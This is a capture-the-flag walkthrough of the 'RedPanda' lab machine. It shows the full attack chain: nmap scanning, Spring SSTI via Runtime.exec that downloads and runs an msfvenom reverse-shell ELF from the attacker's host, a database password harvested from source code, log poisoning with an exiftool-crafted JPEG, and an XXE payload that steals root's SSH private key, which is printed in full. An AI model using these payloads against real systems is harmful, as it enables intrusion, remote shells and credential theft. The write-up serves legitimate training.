# RedPanda

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```
$ export IP=10.10.11.170
$ echo $IP
10.10.11.170
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```
$ ping $IP
PING 10.10.11.170 (10.10.11.170) 56(84) bytes of data.
64 bytes from 10.10.11.170: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.170: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.170: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.170: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Scan

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```
Nmap scan report for 10.10.11.170
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
```

---

## RedPanda Search - Web Scan

So after the scan is done, I check out the web app running IP address on port 8080, and I try manually some paths like `/admin`, `/index.php` but I immediately got an error: 

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
There was an unexpected error (type=Not Found, status=404).
```

After some googling, I found out that this app is running [Spring](https://spring.io) which works with Java.

![RedPanda Search Page](https://i.imgur.com/UrdVfGT.png)

I started typing in the text box some SQL Injection attempts such as `" or 1=1--` ..etc, but all went through with no success, So I tried pressing the search button with no input, and I got a result of a panda called "Greg" whose description was:

> Greg is a hacker. Watch out for his injection attacks!

![Greg Search Result](https://imgur.com/BHh12Az.png)

This shows that I'm on the right path, which is Injection, but maybe not SQL Injection. So I googled about some other types of injections and I read about "Server Side Template Injection" (SSTI), and found this amazing [article on Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

---

## Detecting SSTI

In an attempt to try SSTI on the target machine, I tried the following:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

Most of them gave an error `Banned characters` which might be `%`, `$`. But at last, `*{7*7}` seemed to work perfectly:

![SSTI Injection Success](https://imgur.com/hhEM4zQ.png)

---

## SSTI Exploitation

The next step I will be trying to get a reverse shell to the target machine, so at first i tried to play a little bit with this vulnerability to see how can I get to upload a malware file and executed it on the target machine.

After some reading, I found that `*{T(java.lang.Runtime).getRuntime().exec('')}` can run shell commands through the search field. So I started a Python http server to see if I can get the target machine to connect to my server. At first I entered in the search field `${T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.2:80')}`:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [16/Sep/2022 01:25:32] "GET / HTTP/1.1" 200 -
```

Perfect, now I can upload a file on the target machine and run it, and get a reverse shell. I prepared a non-meterpreter stageless payload using `msfvenom`:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f elf > payload.elf
```

Before uploading the payload to the target machine, I started listening on port 1337 using netcat:

```
$ nc -lvnp 1337                        
listening on [any] 1337 ...

```

And now time to upload the payload. first I uploaded the payload, then I had to change the permissions to execute the payload file, then run it, using the following queries in the search field:

```
*{T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.5/payload.elf")}
*{T(java.lang.Runtime).getRuntime().exec("chmod 777 payload.elf")}
*{T(java.lang.Runtime).getRuntime().exec("./payload.elf")}
```

And we finally got a reverse shell! to make the shell more interactive I executed the following commands:

```
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.170] 51030
whoami
woodenk
python3 -c "import pty; pty.spawn('/bin/bash')"
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  sudo nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo                                 
                                                                                                                                                             
┌──(kali㉿kali)-[~]
                                                 └─$ fg              
[1]  + continued  sudo nc -lvnp 1337
                                    export TERM=xterm
export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls   
ls
887  linpeas  linpeas.sh  notevil1.elf  payload.elf
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

```

### Getting the user flag:

The user flag can be found in /home/woodenk/user.txt

```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /home
cd /home
woodenk@redpanda:/home$ ls
ls
woodenk
woodenk@redpanda:/home$ cd woodenk
cd woodenk
woodenk@redpanda:/home/woodenk$ ls
ls
user.txt
woodenk@redpanda:/home/woodenk$ cat user.txt
cat user.txt
******************************
```

---

## Privilege Escalation

Inside the reverse shell where I spawned at `/tmp/hsperfdata_woodenk` I found [linpeas.sh](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh) which is a tool that enumerates and search possible misconfigurations or any vulnerability to escalate privs on linux machines, so I just run it `/linpeas.sh`.

after linpeas did its magic, I went through and read its output, first thing that got my attention is that there's a service running locally on port 3306 and after I googled it, turns out to be the default port for the classic MySQL protocol, so I tried to connect to it using the user name `woodenk` but It required a password that I didn't have... yet.

After some more digging, I found a path that might be in my interest: `/opt/panda_search/src/main/resources/static/css/panda.css`.

This means that the source files of that web application are located there, which potentially contains some mysql information. I navigated to this location and started digging into these directories at `/opt/panda_search/src`.

I started looking at the directories/files in this location by using `ls -R`, I'm gonna show what caught my attention:

```
woodenk@redpanda:/opt/panda_search/src$ ls -R
ls -R

...

./main/java/com/panda_search/htb/panda_search:
MainController.java  PandaSearchApplication.java  RequestInterceptor.java

...


```

I started with `MainController.java` and read through the code trying to roughly understand what's happening, and the following block of code might be useful:

```
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
cat MainController.java


...

	 public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

In this section we can see that the password of the user `woodenk` on the sql server is `RedPandazRule`, and since port 22 is open and running `OpenSSH` according to the scan at the beginning, I tried to connect through SSH with the username koodenk and this passphrase.

```
$ ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

...

woodenk@redpanda:~$ 
```

I've noticed that when I check `woodenk` privs or groups he belongs to, I found that the reverse shell has more privs than the SSH connection, since the reverse shell was through the panda search jar file, so I the reverse shell has the `logs` group privs, I don't know if it matters, but I'll still be using the reverse shell.


#### Reverse shell:

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

```

#### SSH

```bash
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
woodenk@redpanda:~$ 
```

I connected to the mysql server to see if there's anything that might be interesting:

```
woodenk@redpanda:-$ mysql -u woodenk -p -D red_panda
Enter password: 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| red_panda          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use red_panda
Database changed
mysql> show tables;
+---------------------+
| Tables_in_red_panda |
+---------------------+
| pandas              |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from pandas;
 
...

mysql> 
```

Nothing interesting in these tables, but at least I got the passphrase.

Next step I wanted to see if there's any file that I have access to as a member of `logs` group:

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -group logs 2>/dev/null
find / -group logs 2>/dev/null

/opt/panda_search/redpanda.log
/tmp/hsperfdata_woodenk
/tmp/hsperfdata_woodenk/876
/tmp/hsperfdata_woodenk/payload.elf
/tmp/tomcat-docbase.8080.8834680879492386099
/tmp/tomcat.8080.9622786781858712596
/tmp/tomcat.8080.9622786781858712596/work
/tmp/tomcat.8080.9622786781858712596/work/Tomcat
/tmp/tomcat.8080.9622786781858712596/work/Tomcat/localhost
/tmp/tomcat.8080.9622786781858712596/work/Tomcat/localhost/ROOT
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml
```

### Pspy64

After some googling, I found a tool that can be useful, [pspy](https://github.com/DominicBreuker/pspy) which is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. And I found that a jar file is being executed every once in a while, so I went to take a look at it

```
...
CMD: UID=0    PID=92567  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
...
```

so my intel so far is to analyze the file `/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar` and see if it reads/write to the file `/opt/panda_search/redpanda.log`


I started by investigating that `.jar` file using `jg-gui` and came across the main function in `/logparser/App.class`, I'm gonna break it down into small segments:


#### Main Function

```Java
 public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
```  

Here, the code starts by reading the file `/opt/panda_search/redpanda.log` line by line and does the following:

* Is this line about a `.jpg` file?
```Java
  public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
```

* IF no, leave.

* IF yes, run the function `parseLog` on that line:

```Java
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
```

Here it splits the line on the `||` characters, where the first argument is a status code, must be an `int`, second parameter and the third are strings, and the fourth one is the URI to the image. So the format in this `.log` file must be as following:

```
[INT] || [STR] || [STR] || [URI]
```

* The program then gets the value in the `Artist: ` field in the jpg headers, and runs `addViewTo` to open the xml file `[ARTIST]_creds.xml`, and that's enough for me! I just want the program to read a poisoned XML file that I made and then get root access, since the use `root` is the one who's running this program!

---

## XXE To Root

I started by making a poisoned jpg file that has `Artist: ` tag as a path to my XML file, I made it with paint and executed the following command to modify its headers:

```bash
└─$ exiftool -Artist="../tmp/pwn"  jpgpayload.jpg
```

Then I crafted my XXE payload and named it `pwn_creds.xml` to read the private SSH key of the root user:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY sp SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../tmp/jpgpayload.jpg</uri>
    <views>1</views>
    <foo>&sp;</foo>
  </image>
  <totalviews>2</totalviews>
</credits>
```

Next step I downloaded these files in the `/tmp` directory since the group `logs` had read/write privileges.
Last step I modified the contents of `redpanda.log` to the following:

```
420||p||p||/../../../../../../../tmp/jpgpayload.jpg
```

And that's it! I went to the website and entered anything in the search and hit enter, then I went back to the xml file and got the SSH Key:

```xml
</credits>woodenk@redpanda:/tmp$ cat pwn_creds.xml
cat pwn_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../tmp/jpgpayload.jpg</uri>
    <views>2</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>3</totalviews>
</credits>
woodenk@redpanda:/tmp$ 

```

I saved this key and connected to the target machine using this rsa key and got my root flag

```bash
└─$ chmod 600 rootkey

└─$ ssh root@$IP -i rootkey
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

...

Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# ls
root.txt  run_credits.sh
root@redpanda:~# cat root.txt
*******************************f
root@redpanda:~# 

```

---